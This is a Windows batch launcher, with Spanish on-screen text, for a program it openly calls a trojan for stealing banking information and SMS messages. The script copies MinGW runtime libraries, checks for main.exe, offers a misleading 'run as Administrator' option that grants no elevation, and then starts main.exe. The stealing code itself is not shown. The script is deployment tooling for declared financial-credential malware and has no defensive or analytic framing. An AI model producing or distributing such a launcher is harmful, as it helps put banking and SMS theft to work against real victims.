@echo off
title TROYANO WASM - SISTEMA DE ROBO DE INFORMACIÓN BANCARIA Y SMS v1.0
color 0A
cls

echo ============================================================
echo    TROYANO WASM v1.0 - SISTEMA DE ROBO DE INFORMACIÓN
echo    Bancaria y SMS - INICIANDO...
echo ============================================================
echo.

REM --- VERIFICAR QUE EXISTEN LAS DLLS NECESARIAS ---
echo [i] Verificando librerías del compilador MinGW...
echo.

if not exist "libstdc++-6.dll" (
    echo [!] Copiando libstdc++-6.dll...
    copy /Y "..\mingw64\bin\libstdc++-6.dll" . 2>nul || (
        echo [!] ERROR: No se encontró libstdc++-6.dll en mingw64\bin
        pause
        exit /b 1
    )
)

if not exist "libgcc_s_seh-1.dll" (
    echo [i] Copiando libgcc_s_seh-1.dll...
    copy /Y "..\mingw64\bin\libgcc_s_seh-1.dll" . 2>nul || (
        echo [!] ERROR: No se encontró libgcc_s_seh-1.dll en mingw64\bin
        pause
        exit /b 1
    )
)

if not exist "libwinpthread-1.dll" (
    echo [i] Copiando libwinpthread-1.dll...
    copy /Y "..\mingw64\bin\libwinpthread-1.dll" . 2>nul || (
        echo [!] ERROR: No se encontró libwinpthread-1.dll en mingw64\bin
        pause
        exit /b 1
    )
)

if not exist "libgomp-1.dll" (
    echo [i] Copiando libgomp-1.dll...
    copy /Y "..\mingw64\bin\libgomp-1.dll" . 2>nul || (
        echo [!] ERROR: No se encontró libgomp-1.dll en mingw64\bin
        pause
        exit /b 1
    )
)

echo [+] Todas las librerías verificadas correctamente.
echo.

REM --- VERIFICAR QUE EXISTE MAIN.EXE ---
if not exist "main.exe" (
    echo [!] ERROR: main.exe no encontrado en la carpeta actual.
    pause
    exit /b 1
)

echo [+] main.exe encontrado.
echo.

REM --- PREGUNTAR AL USUARIO SI QUIERE EJECUTAR COMO ADMINISTRADOR ---
set /p ADMIN="¿Ejecutar como Administrador? (s/n): "
if /i "%ADMIN%"=="s" (
    start "" cmd /c "start /B main.exe"
) else (
    echo [+] Ejecutando main.exe...
    start "" main.exe
)

echo.
echo ============================================================
echo    TROYANO WASM - EJECUCIÓN COMPLETADA
echo ============================================================
pause >nul
